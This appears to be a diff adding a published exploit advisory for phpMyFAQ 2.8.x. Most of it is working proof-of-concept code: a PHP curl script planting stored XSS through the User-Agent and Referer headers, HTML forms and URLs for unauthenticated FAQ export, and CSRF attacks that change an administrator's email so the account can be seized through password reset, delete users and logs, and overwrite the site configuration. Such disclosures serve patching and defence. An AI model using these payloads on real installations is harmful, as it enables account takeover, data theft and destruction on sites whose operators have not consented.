@@ -1,0 +1,207 @@
+#Title: phpMyFAQ 2.8.X - Multiple Vulnerabilities
+#Vendor: phpmyfaq.de
+#Date: 04.09.19
+#Version: >= 2.8.12 (Latest ATM)
+#Tested on: Apache 2.2 / PHP 5.4 / Linux
+#Contact: smash [at] devilteam.pl
+ 
+ 
+1) Persistent XSS
+ 
+Administrator is able to view information about specific user session in 'Statistic' tab. Over there, you may find informations such as user ip, refferer and user agent.
+ 
+For example, to view informations about session with ID 1, you need visit following address:
+http://localhost/phpmyfaq/admin/?action=viewsession&id=1
+ 
+Refferer and User Agent variables are not filtered, which allows attacker to inject javascript via those parameters. All you need to do, is to perform particular HTTP request which will contain javascript. For example, if you will produce hundrends of those request, there will be hundrends of Persistent XSS - Victim only needs to visit any of them.
+ 
+PoC:
+ 
+<?php
+  
+$ch =curl_init("http://localhost/phpmyfaq/index.php");
+curl_setopt($ch,CURLOPT_USERAGENT,'<script>alert(666)</script>');
+curl_setopt($ch, CURLOPT_REFERER, '<script>alert(123)</script>');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+  
+?>
+ 
+Vuln (viewsession):
+ 
+<tbody>
+    <tr>
+<td>2014-09-04 02:22:04</td>
+<td>new_session (0)</td>
+    </tr>
+    <tr>
+<td>Referer:</td>
+<td>
+    <a href="<script>alert(123)</script>" target="_blank">
+<script>alert(123)</script>    </a>
+</td>
+    </tr>
+    <tr>
+<td>Browser:</td>
+<td><script>alert(666)</script></td>
+    </tr>
+    <tr>
+<td>IP-Address:</td>
+<td>::1</td>
+    </tr>
+</tbody>
+ 
+ 
+ 
+2) Remote FAQ Disclosure
+ 
+Administrator is able to view or download FAQ data using few extensions (xhtml, xml, pdf). Because of no user restrictions, attacker may reproduce this vulnerability to perform those actions even without having an account.
+ 
+ - Download
+ 
+<html>
+  <body>
+    <form action="http://localhost/phpmyfaq/admin/?action=exportfile" method="POST">
+      <input type="hidden" name="catid" value="0" />
+      <input type="hidden" name="downwards" value="1" />
+      <input type="hidden" name="type" value="xml" />
+      <input type="hidden" name="dispos" value="attachment" />
+      <input type="hidden" name="submitExport" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+ - View
+ 
+<html>
+  <body>
+    <form action="http://localhost/phpmyfaq/admin/?action=exportfile" method="POST">
+      <input type="hidden" name="catid" value="0" />
+      <input type="hidden" name="downwards" value="1" />
+      <input type="hidden" name="type" value="xml" />
+      <input type="hidden" name="dispos" value="inline" />
+      <input type="hidden" name="submitExport" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+ 
+ 
+3) CSRF
+ 
+ - Edit user credentials (login/mail)
+ 
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/phpmyfaq/admin/?action=user&user_action=update_data" method="POST">
+      <input type="hidden" name="user_id" value="1" />
+      <input type="hidden" name="user_status" value="active" />
+      <input type="hidden" name="display_name" value="haked" />
+      <input type="hidden" name="email" value="victim@vic.tim" />
+      <input type="hidden" name="last_modified" value="undefined" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+By then, you may generate new password for victim using 'Forgot password' option - just provide your email so you can grab it.
+ 
+ 
+ - Delete user
+ 
+http://localhost/phpmyfaq/admin/index.php?action=ajax&ajax=user&ajaxaction=delete_user&user_id=1
+ 
+ 
+ - Delete category
+ 
+http://localhost/phpmyfaq/admin/?action=deletecategory&cat=1&catlang=en
+ 
+ 
+ - Delete session (month)
+ 
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/phpmyfaq/admin/?action=viewsessions" method="POST">
+      <input type="hidden" name="month" value="092014" />
+      <input type="hidden" name="statdelete" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+ 
+ - Delete logs older than 30 days
+ 
+http://localhost/phpmyfaq/admin/?action=deleteadminlog
+ 
+ 
+ - Add stopword
+ 
+http://localhost/phpmyfaq/admin/index.php?action=ajax&ajax=config&ajaxaction=save_stop_word&stopword=lolwut&stopwords_lang=en
+ 
+ 
+ - Edit configuration
+ 
+Affected:
+Main configuration
+FAQ records configuration
+Search
+Security configuration
+Spam control center
+Social network configuration
+ 
+PoC:
+ 
+<html>
+  <body>
+    <form action="http://localhost/phpmyfaq/admin/?action=config&config_action=saveConfig" method="POST">
+      <input type="hidden" name="edit[main.language]" value="language_en.php" />
+      <input type="hidden" name="edit[main.languageDetection]" value="true" />
+      <input type="hidden" name="edit[main.titleFAQ]" value="phpMyFAQ Codename Perdita" />
+      <input type="hidden" name="edit[main.currentVersion]" value="2.8.12" />
+      <input type="hidden" name="edit[main.metaDescription]" value="lolwat" />
+      <input type="hidden" name="edit[main.metaKeywords]" value="" />
+      <input type="hidden" name="edit[main.metaPublisher]" value="Whatever" />
+      <input type="hidden" name="edit[main.administrationMail]" value="what@ever.com" />
+      <input type="hidden" name="edit[main.contactInformations]" value="" />
+      <input type="hidden" name="edit[main.send2friendText]" value="" />
+      <input type="hidden" name="edit[main.enableUserTracking]" value="true" />
+      <input type="hidden" name="edit[main.enableAdminLog]" value="true" />
+      <input type="hidden" name="edit[main.referenceURL]" value="http://localhost/phpmyfaq" />
+      <input type="hidden" name="edit[main.urlValidateInterval]" value="86400" />
+      <input type="hidden" name="edit[main.enableWysiwygEditor]" value="true" />
+      <input type="hidden" name="edit[main.templateSet]" value="default" />
+      <input type="hidden" name="edit[main.dateFormat]" value="Y-m-d H:i" />
+      <input type="hidden" name="edit[records.maxAttachmentSize]" value="100000" />
+      <input type="hidden" name="edit[records.disableAttachments]" value="true" />
+      <input type="hidden" name="edit[records.numberOfRecordsPerPage]" value="10" />
+      <input type="hidden" name="edit[records.numberOfShownNewsEntries]" value="3" />
+      <input type="hidden" name="edit[records.numberOfRelatedArticles]" value="5" />
+      <input type="hidden" name="edit[records.orderby]" value="id" />
+      <input type="hidden" name="edit[records.sortby]" value="DESC" />
+      <input type="hidden" name="edit[records.attachmentsPath]" value="attachments" />
+      <input type="hidden" name="edit[records.defaultAttachmentEncKey]" value="" />
+      <input type="hidden" name="edit[records.orderingPopularFaqs]" value="visits" />
+      <input type="hidden" name="edit[records.autosaveSecs]" value="180" />
+      <input type="hidden" name="edit[search.numberSearchTerms]" value="10" />
+      <input type="hidden" name="edit[search.relevance]" value="thema,content,keywords" />
+      <input type="hidden" name="edit[security.bannedIPs]" value="" />
+      <input type="hidden" name="edit[security.permLevel]" value="basic" />
+      <input type="hidden" name="edit[security.ssoLogoutRedirect]" value="" />
+      <input type="hidden" name="edit[spam.enableSafeEmail]" value="true" />
+      <input type="hidden" name="edit[spam.checkBannedWords]" value="true" />
+      <input type="hidden" name="edit[spam.enableCaptchaCode]" value="true" />
+      <input type="hidden" name="edit[socialnetworks.twitterConsumerKey]" value="" />
+      <input type="hidden" name="edit[socialnetworks.twitterConsumerSecret]" value="" />
+      <input type="hidden" name="edit[socialnetworks.twitterAccessTokenKey]" value="" />
+      <input type="hidden" name="edit[socialnetworks.twitterAccessTokenSecret]" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
